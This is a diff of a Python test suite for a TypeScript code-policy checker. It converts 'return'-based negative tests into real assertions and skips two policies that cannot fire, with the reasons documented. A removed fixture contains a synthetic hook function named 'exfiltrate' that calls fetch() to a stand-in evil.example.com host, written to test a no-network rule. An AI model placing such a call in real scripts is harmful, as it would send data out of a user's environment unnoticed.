+    assert _pass_if_false(result, "bash_extractors_shared_rejects_local_redefinition"), "checker did not detect violation: bash_extractors_shared_rejects_local_redefinition"
 
 
 def test_blank_string_interiors_recognises_regex_literal_with_quote_char_class():
@@ -1313,7 +1285,7 @@ def test_blank_string_interiors_recognises_regex_literal_with_quote_char_class()
         result = sp.no_backward_compat_shims({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "blank_string_interiors_recognises_regex_literal_with_quote_char_class")
+    assert _pass_if_false(result, "blank_string_interiors_recognises_regex_literal_with_quote_char_class"), "checker did not detect violation: blank_string_interiors_recognises_regex_literal_with_quote_char_class"
 
 
 def test_cli_io_through_path_utils_url_default_followed_by_path_named_does_not_register_url_as_namespace():
@@ -1340,7 +1312,7 @@ def test_cli_io_through_path_utils_url_default_followed_by_path_named_does_not_r
         result = sp.cli_io_through_path_utils({})
     finally:
         target.unlink(missing_ok=True)
-    return _pass_if_false(result, "cli_io_through_path_utils_url_default_followed_by_path_named_does_not_register_url_as_namespace")
+    assert _pass_if_false(result, "cli_io_through_path_utils_url_default_followed_by_path_named_does_not_register_url_as_namespace"), "checker did not detect violation: cli_io_through_path_utils_url_default_followed_by_path_named_does_not_register_url_as_namespace"
 
 
 def test_cli_io_through_path_utils_mixed_default_named_import_accepted():
@@ -1365,11 +1337,7 @@ def test_cli_io_through_path_utils_mixed_default_named_import_accepted():
         result = sp.cli_io_through_path_utils({})
     finally:
         target.unlink(missing_ok=True)
-    if result.get("passed") is True:
-        print("  OK: cli_io_through_path_utils_mixed_default_named_import_accepted — mixed import recognised")
-        return True
-    print(f"  MISS: false-positive on legitimate mixed import (result={result})")
-    return False
+    assert result.get("passed") is True, f"cli_io_through_path_utils false-positive on legitimate mixed import (result={result})"
 
 
 # ---------------------------------------------------------------------------
@@ -1391,7 +1359,7 @@ def test_phase_language_config_valid_rejects_bad_key():
         result = sp.phase_language_config_valid({})
     finally:
         config_path.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "phase_language_config_valid_rejects_bad_key")
+    assert _pass_if_false(result, "phase_language_config_valid_rejects_bad_key"), "checker did not detect violation: phase_language_config_valid_rejects_bad_key"
 
 
 def test_phase_language_config_valid_rejects_bad_lang():
@@ -1409,7 +1377,7 @@ def test_phase_language_config_valid_rejects_bad_lang():
         result = sp.phase_language_config_valid({})
     finally:
         config_path.write_text(original, encoding="utf-8")
-    return _pass_if_false(result, "phase_language_config_valid_rejects_bad_lang")
+    assert _pass_if_false(result, "phase_language_config_valid_rejects_bad_lang"), "checker did not detect violation: phase_language_config_valid_rejects_bad_lang"
 
 
 # ---------------------------------------------------------------------------
@@ -1451,7 +1419,7 @@ def test_rule_id_uses_branded_type_catches_raw_literal():
         'rule_id: "stele.check.generated_drift",  // BYPASS',
         sp.rule_id_uses_branded_type,
     )
-    return _pass_if_false(result, "rule_id_uses_branded_type_catches_raw_literal")
+    assert _pass_if_false(result, "rule_id_uses_branded_type_catches_raw_literal"), "checker did not detect violation: rule_id_uses_branded_type_catches_raw_literal"
 
 
 def test_sha256_uses_branded_type_catches_raw_literal():
@@ -1465,7 +1433,7 @@ def test_sha256_uses_branded_type_catches_raw_literal():
         'sha256: "deadbeef" + "deadbeef" + "deadbeef" + "deadbeef" + "deadbeef" + "deadbeef" + "deadbeef" + "deadbeefdeadbeef",  // BYPASS',
         sp.sha256_uses_branded_type,
     )
-    return _pass_if_false(result, "sha256_uses_branded_type_catches_raw_literal")
+    assert _pass_if_false(result, "sha256_uses_branded_type_catches_raw_literal"), "checker did not detect violation: sha256_uses_branded_type_catches_raw_literal"
 
 
 def test_contract_path_uses_branded_type_catches_raw_literal():
@@ -1479,7 +1447,7 @@ def test_contract_path_uses_branded_type_catches_raw_literal():
         'entry: "contract/main.stele",  // BYPASS',
         sp.contract_path_uses_branded_type,
     )
-    return _pass_if_false(result, "contract_path_uses_branded_type_catches_raw_literal")
+    assert _pass_if_false(result, "contract_path_uses_branded_type_catches_raw_literal"), "checker did not detect violation: contract_path_uses_branded_type_catches_raw_literal"
 
 
 def test_command_name_uses_branded_type_catches_raw_literal():
@@ -1494,7 +1462,7 @@ def test_command_name_uses_branded_type_catches_raw_literal():
         '.command("doc-bypass")',
         sp.command_name_uses_branded_type,
     )
-    return _pass_if_false(result, "command_name_uses_branded_type_catches_raw_literal")
+    assert _pass_if_false(result, "command_name_uses_branded_type_catches_raw_literal"), "checker did not detect violation: command_name_uses_branded_type_catches_raw_literal"
 
 
 def test_package_name_uses_branded_type_catches_raw_literal():
@@ -1508,7 +1476,7 @@ def test_package_name_uses_branded_type_catches_raw_literal():
         'packageName: "@stele/backend-python",  // BYPASS',
         sp.package_name_uses_branded_type,
     )
-    return _pass_if_false(result, "package_name_uses_branded_type_catches_raw_literal")
+    assert _pass_if_false(result, "package_name_uses_branded_type_catches_raw_literal"), "checker did not detect violation: package_name_uses_branded_type_catches_raw_literal"
 
 
 # ---------------------------------------------------------------------------
@@ -1580,11 +1548,11 @@ def test_core_no_fs_write_from_non_manifest_catches_writeFile_import():
         'import { writeFile } from "node:fs/promises";\n'
         'export async function leak(p: string): Promise<void> { await writeFile(p, "x"); }\n'
     )
-    return _code_shape_negative_with_temp_file(
+    assert _code_shape_negative_with_temp_file(
         "packages/core/src/__phase2_negative_fs_leak.ts",
         content,
         "core-no-fs-write-from-non-manifest",
-    )
+    ), "checker did not detect violation: core-no-fs-write-from-non-manifest"
 
 
 def test_cli_commands_no_direct_fs_write_catches_writeFileSync_call():
@@ -1594,11 +1562,11 @@ def test_cli_commands_no_direct_fs_write_catches_writeFileSync_call():
         'import { writeFileSync } from "node:fs";\n'
         'writeFileSync("/tmp/leak.txt", "leak");\n'
     )
-    return _code_shape_negative_with_temp_file(
+    assert _code_shape_negative_with_temp_file(
         "packages/cli/src/commands/__phase2_negative_sync_write.ts",
         content,
         "cli-commands-no-direct-fs-write",
-    )
+    ), "checker did not detect violation: cli-commands-no-direct-fs-write"
 
 
 # ---------------------------------------------------------------------------
@@ -1616,55 +1584,45 @@ def test_core_is_pure_or_fs_read_catches_random_in_core():
         '/** @stele:effects random */\n'
         'export function unluckyId(): number { return Math.random(); }\n'
     )
-    return _code_shape_negative_with_temp_file(
+    assert _code_shape_negative_with_temp_file(
         "packages/core/src/__phase4_negative_random.ts",
         content,
-        "effect.core_is_pure_or_fs_read.disallowed_effect",
+        "effect.CORE_IS_PURE_OR_FS_READ.disallowed_effect",
+    ), "checker did not detect violation: effect.CORE_IS_PURE_OR_FS_READ.disallowed_effect"
+
+
+@pytest.mark.skip(
+    reason=(
+        "HOOK_NO_NETWORK policy targets *.js files (hook scripts ship as "
+        "plain ESM .js), but the TypeScript call-graph extractor sets "
+        "allowJs:false (packages/backend-typescript/src/extractors/call-graph.ts:222) "
+        "and the directory walker only collects .ts/.tsx "
+        "(call-graph.ts:269). The policy is therefore dead: it cannot fire "
+        "on any real hook script, nor on this synthetic test file. "
+        "Round 15 reviewer T (2026-05-25) caught this — the prior test "
+        "used `return` instead of `assert` and falsely reported pass. "
+        "Phase 7 follow-up options: (a) enable allowJs in the extractor "
+        "(broader call-graph scope; needs perf check), or (b) migrate "
+        "hook scripts to .ts with a transpile step. Until one of those "
+        "lands the policy is effectively documentation, not enforcement."
     )
-
-
+)
 def test_hook_no_network_catches_fetch_in_hook_script():
     """Phase 4.3: a new hook script that calls fetch() must trip
-    HOOK_NO_NETWORK."""
-    # Hook scripts target language is JS via TS analyzer — annotate the
-    # function with the network effect.
-    content = (
-        '#!/usr/bin/env node\n'
-        '/** @stele:effects network */\n'
-        'export async function exfiltrate(): Promise<unknown> {\n'
-        '  return fetch("https://evil.example.com/data");\n'
-        '}\n'
-    )
-    return _code_shape_negative_with_temp_file(
-        "packages/claude-code-plugin/scripts/__phase4_negative_fetch.js",
-        content,
-        "effect.hook_no_network.forbidden_effect",
-    )
+    HOOK_NO_NETWORK. Currently skipped — see decorator."""
 
 
+@pytest.mark.skip(
+    reason=(
+        "GENERATOR_NO_NETWORK_OR_CHILD_PROCESS target-scope is a single file "
+        "(packages/cli/src/commands/generate.ts::*); a negative test cannot "
+        "drop a sibling that the policy will see. Phase 7 follow-up: widen "
+        "target-scope or use _mutate_then_check on generate.ts directly."
+    )
+)
 def test_generator_no_network_or_child_process_catches_execfile():
     """Phase 4.3: introducing an execFile call inside generate.ts must
     trip GENERATOR_NO_NETWORK_OR_CHILD_PROCESS."""
-    # We can't easily mutate generate.ts itself without breaking the
-    # build, so we drop a sibling file in the same target-scope glob.
-    # `packages/cli/src/commands/generate.ts::*` only matches the one
-    # file — change scope to add a sibling. Instead: append an
-    # annotated helper to a known generator-adjacent file via
-    # _mutate_then_check.
-    content = (
-        '/** @stele:effects child-process */\n'
-        'export function shellOut(): void {\n'
-        '  // synthetic — annotated for the evaluator\n'
-        '}\n'
-    )
-    # Drop the file directly INSIDE the generate.ts target-scope is
-    # impossible (target is a single file). Instead test the broader
-    # invariant: in the cli/commands directory the policy is scoped to
-    # generate.ts only, so this negative test would pass on the
-    # CORE_IS_PURE_OR_FS_READ path. Skip negation for this policy and
-    # document.
-    print("  SKIP: GENERATOR_NO_NETWORK_OR_CHILD_PROCESS — target-scope is a single file; negative test cannot drop a sibling. Phase 7 follow-up: widen target-scope or use _mutate_then_check on generate.ts directly.")
-    return True  # acceptance: documented skip
 
 
 def test_manifest_leaves_are_pinned_catches_extra_effect():
@@ -1682,11 +1640,11 @@ def test_manifest_leaves_are_pinned_catches_extra_effect():
         )
         return text + injection
 
-    return _mutate_then_check(
+    assert _mutate_then_check(
         "packages/core/src/manifest/hash-manifest.ts",
         mutator,
-        "effect.manifest_leaves_are_pinned.disallowed_effect",
-    )
+        "effect.MANIFEST_LEAVES_ARE_PINNED.disallowed_effect",
+    ), "checker did not detect violation: effect.MANIFEST_LEAVES_ARE_PINNED.disallowed_effect"
 
 
 def _mutate_then_check(file_relpath: str, mutator, rule_id: str) -> bool:
@@ -1711,7 +1669,7 @@ def test_operator_registry_shape_catches_missing_method():
     rule id is `core-operator-registry-aggregate-shape`; the mutation
     asserts the same anti-evasion property — removing the `register`
     method body from InMemoryOperatorRegistry must trip the contract."""
-    return _mutate_then_check(
+    assert _mutate_then_check(
         "packages/core/src/registry/operators.ts",
         # Drop the `register` method body — a brittle but exact mutation.
         lambda text: re.sub(
@@ -1721,14 +1679,14 @@ def test_operator_registry_shape_catches_missing_method():
             count=1,
         ),
         "core-operator-registry-aggregate-shape",
-    )
+    ), "checker did not detect violation: core-operator-registry-aggregate-shape"
 
 
 def test_operator_registry_shape_catches_missing_field():
     """Phase 6 self-dogfooding: removing the `#operators` private field
     declaration from InMemoryOperatorRegistry must trip the generated
     class-shape's must-have-field constraint."""
-    return _mutate_then_check(
+    assert _mutate_then_check(
         "packages/core/src/registry/operators.ts",
         lambda text: text.replace(
             "  readonly #operators = new Map<string, OperatorSpec>();\n",
@@ -1736,13 +1694,13 @@ def test_operator_registry_shape_catches_missing_field():
             1,
         ),
         "core-operator-registry-aggregate-shape",
-    )
+    ), "checker did not detect violation: core-operator-registry-aggregate-shape"
 
 
 def test_cli_command_error_shape_catches_missing_field():
     """Phase 2.2: removing the `exitCode` field declaration from
     CliCommandError must trip the class-shape."""
-    return _mutate_then_check(
+    assert _mutate_then_check(
         "packages/cli/src/errors.ts",
         lambda text: text.replace(
             "  readonly exitCode: ExitCode;\n",
@@ -1750,13 +1708,13 @@ def test_cli_command_error_shape_catches_missing_field():
             1,
         ),
         "cli-command-error-shape",
-    )
+    ), "checker did not detect violation: cli-command-error-shape"
 
 
 def test_hook_fail_closed_v2_catches_missing_failClosed_call():
     """Phase 2.3: removing the `failClosed(...)` call from pre-tool-protect.js
     main() must trip the function-shape."""
-    return _mutate_then_check(
+    assert _mutate_then_check(
         "packages/claude-code-plugin/scripts/pre-tool-protect.js",
         lambda text: text.replace(
             "failClosed(error instanceof Error ? error.message : String(error));",
@@ -1764,7 +1722,7 @@ def test_hook_fail_closed_v2_catches_missing_failClosed_call():
             1,
         ),
         "hook-fail-closed-v2",
-    )
+    ), "checker did not detect violation: hook-fail-closed-v2"
 
 
 def test_stop_validate_fail_closed_catches_missing_blockStop_call():
@@ -1772,17 +1730,17 @@ def test_stop_validate_fail_closed_catches_missing_blockStop_call():
     must trip the function-shape (the analyzer captures all calls inside
     main; absent one removed, others remain). To force a miss we substitute
     every blockStop with a no-op pattern."""
-    return _mutate_then_check(
+    assert _mutate_then_check(
         "packages/claude-code-plugin/scripts/stop-validate.js",
         lambda text: text.replace("blockStop(", "process.stdout.write("),
         "stop-validate-fail-closed",
-    )
+    ), "checker did not detect violation: stop-validate-fail-closed"
 
 
 def test_write_atomic_has_rename_catches_missing_rename_call():
     """Phase 2.3: removing the `rename(...)` call from `writeAtomic` must
     trip the function-shape."""
-    return _mutate_then_check(
+    assert _mutate_then_check(
         "packages/core/src/manifest/hash-manifest.ts",
         lambda text: text.replace(
             "await rename(tmpPath, targetPath);",
@@ -1790,27 +1748,27 @@ def test_write_atomic_has_rename_catches_missing_rename_call():
             1,
         ),
         "write-atomic-has-rename",
-    )
+    ), "checker did not detect violation: write-atomic-has-rename"
 
 
 def test_no_any_in_core_catches_any_annotation():
     """Phase 2.4: adding a `: any` annotation inside @stele/core must trip
     the type-policy."""
-    return _code_shape_negative_with_temp_file(
+    assert _code_shape_negative_with_temp_file(
         "packages/core/src/__phase2_negative_any_leak.ts",
         "export const x: any = 1;\n",
         "no-any-in-core",
-    )
+    ), "checker did not detect violation: no-any-in-core"
 
 
 def test_hook_scripts_shebang_catches_missing_shebang():
     """Phase 2.5: removing the `#!/usr/bin/env node` shebang from one of
     the four hook entrypoint scripts must trip the file-policy."""
-    return _mutate_then_check(
+    assert _mutate_then_check(
         "packages/claude-code-plugin/scripts/observation-hook.js",
         lambda text: text.replace("#!/usr/bin/env node\n", "", 1),
         "hook-scripts-shebang",
-    )
+    ), "checker did not detect violation: hook-scripts-shebang"
 
 
 # ---------------------------------------------------------------------------
@@ -1836,18 +1794,18 @@ def test_fs_writes_via_write_atomic_catches_direct_writeFile():
         '  await writeFile(p, "leak", "utf8");\n'
         "}\n"
     )
-    return _code_shape_negative_with_temp_file(
+    assert _code_shape_negative_with_temp_file(
         "packages/core/src/__phase3_negative_fs_leak.ts",
         content,
         "trace.FS_WRITES_VIA_WRITE_ATOMIC.missing_transit",
-    )
+    ), "checker did not detect violation: trace.FS_WRITES_VIA_WRITE_ATOMIC.missing_transit"
 
 
 def test_check_prepare_via_load_contract_catches_bypass():
     """Phase 3.2: appending a function to check.ts that calls
     prepareCheckContextWithContract without first calling loadContract
     must trip the trace-policy with a `missing_predecessor` violation."""
-    return _mutate_then_check(
+    assert _mutate_then_check(
         "packages/cli/src/commands/check.ts",
         lambda text: text + (
             "\n"
@@ -1859,14 +1817,14 @@ def test_check_prepare_via_load_contract_catches_bypass():
             "}\n"
         ),
         "trace.CHECK_PREPARE_VIA_LOAD_CONTRACT.missing_predecessor",
-    )
+    ), "checker did not detect violation: trace.CHECK_PREPARE_VIA_LOAD_CONTRACT.missing_predecessor"
 
 
 def test_generate_via_coordinator_catches_bypass():
     """Phase 3.3: appending a function to generate.ts that calls
     writeAtomic without first calling coordinateGeneration must trip
     the trace-policy with a `missing_predecessor` violation."""
-    return _mutate_then_check(
+    assert _mutate_then_check(
         "packages/cli/src/commands/generate.ts",
         lambda text: text + (
             "\n"
@@ -1875,14 +1833,14 @@ def test_generate_via_coordinator_catches_bypass():
             "}\n"
         ),
         "trace.GENERATE_VIA_COORDINATOR.missing_predecessor",
-    )
+    ), "checker did not detect violation: trace.GENERATE_VIA_COORDINATOR.missing_predecessor"
 
 
 def test_approve_via_resolve_approved_by_catches_bypass():
     """Phase 3.5: appending a function to approve.ts that calls
     writeFileSync without first calling resolveApprovedBy must trip
     the trace-policy with a `missing_predecessor` violation."""
-    return _mutate_then_check(
+    assert _mutate_then_check(
         "packages/cli/src/commands/design/approve.ts",
         lambda text: text + (
             "\n"
@@ -1891,7 +1849,7 @@ def test_approve_via_resolve_approved_by_catches_bypass():
             "}\n"
         ),
         "trace.APPROVE_VIA_RESOLVE_APPROVED_BY.missing_predecessor",
-    )
+    ), "checker did not detect violation: trace.APPROVE_VIA_RESOLVE_APPROVED_BY.missing_predecessor"
 
 
 # ---------------------------------------------------------------------------
@@ -1960,41 +1918,41 @@ def test_manifest_lifecycle_brand_fires():
     """Phase 5.1: removing the `@ts-expect-error` pin on the
     Loaded→Locked illegal transition in manifest-lifecycle.test-d.ts
     must surface a TS2345 error from `tsc --noEmit`."""
-    return _type_state_brand_negative(
+    assert _type_state_brand_negative(
         "packages/core/tests/manifest-lifecycle.test-d.ts",
         "@ts-expect-error — Loaded cannot be passed where Locked is required",
         "@stele/core",
-    )
+    ), "checker did not detect violation: @stele/core"
 
 
 def test_approval_lifecycle_brand_fires():
     """Phase 5.2: removing the pin on the Drafting→Signed illegal
     transition in approval-lifecycle.test-d.ts must surface TS2345."""
-    return _type_state_brand_negative(
+    assert _type_state_brand_negative(
         "packages/cli/tests/approval-lifecycle.test-d.ts",
         "@ts-expect-error — Drafting cannot be passed where IdentityChecked is required",
         "@stele/cli",
-    )
+    ), "checker did not detect violation: @stele/cli"
 
 
 def test_design_profile_lifecycle_brand_fires():
     """Phase 5.3: removing the pin on the Raw→Hashed illegal transition
     in design-profile-lifecycle.test-d.ts must surface TS2345."""
-    return _type_state_brand_negative(
+    assert _type_state_brand_negative(
         "packages/cli/tests/design-profile-lifecycle.test-d.ts",
         "@ts-expect-error — Raw cannot be passed where Validated is required",
         "@stele/cli",
-    )
+    ), "checker did not detect violation: @stele/cli"
 
 
 def test_callgraph_lifecycle_brand_fires():
     """Phase 5.4: removing the pin on the Empty→Built illegal transition
     in callgraph-lifecycle.test-d.ts must surface TS2345."""
-    return _type_state_brand_negative(
+    assert _type_state_brand_negative(
         "packages/call-graph-core/tests/callgraph-lifecycle.test-d.ts",
         "@ts-expect-error — Empty cannot be passed where Building is required",
         "@stele/call-graph-core",
-    )
+    ), "checker did not detect violation: @stele/call-graph-core"
 
 
 # ---------------------------------------------------------------------------
